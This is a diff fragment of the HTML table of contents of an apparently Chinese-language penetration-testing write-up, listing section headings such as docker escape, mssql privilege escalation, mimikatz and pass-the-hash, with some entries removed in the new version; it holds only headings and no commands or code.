-                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E8%B7%B3%E6%9D%BF"><span class="toc-number">2.</span> <span class="toc-text">外网跳板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-proc"><span class="toc-number">2.0.1.</span> <span class="toc-text">Linux proc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker-%E9%80%83%E9%80%B8"><span class="toc-number">2.1.</span> <span class="toc-text">docker 逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-crontab-%E5%92%8C-var-spool-cron%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">&#x2F;etc&#x2F;crontab 和 &#x2F;var&#x2F;spool&#x2F;cron区别：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">3.</span> <span class="toc-text">内网移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mssql"><span class="toc-number">3.1.</span> <span class="toc-text">mssql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.1.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hashdump"><span class="toc-number">3.1.2.</span> <span class="toc-text">hashdump</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz"><span class="toc-number">3.1.3.</span> <span class="toc-text">mimikatz</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH"><span class="toc-number">3.2.</span> <span class="toc-text">PTH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IPC-%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.2.</span> <span class="toc-text">IPC$及利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.3.</span> <span class="toc-text">CS攻击</span></a></li></ol></li></ol></li></ol>
+                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E8%B7%B3%E6%9D%BF"><span class="toc-number">1.</span> <span class="toc-text">外网跳板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-proc"><span class="toc-number">1.0.1.</span> <span class="toc-text">Linux proc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker-%E9%80%83%E9%80%B8"><span class="toc-number">1.1.</span> <span class="toc-text">docker 逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#etc-crontab-%E5%92%8C-var-spool-cron%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">&#x2F;etc&#x2F;crontab 和 &#x2F;var&#x2F;spool&#x2F;cron区别：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">2.</span> <span class="toc-text">内网移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mssql"><span class="toc-number">2.1.</span> <span class="toc-text">mssql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.1.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH"><span class="toc-number">2.2.</span> <span class="toc-text">PTH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.1.</span> <span class="toc-text">CS攻击</span></a></li></ol></li></ol></li></ol>
                                   </div>
                               </button>
                           
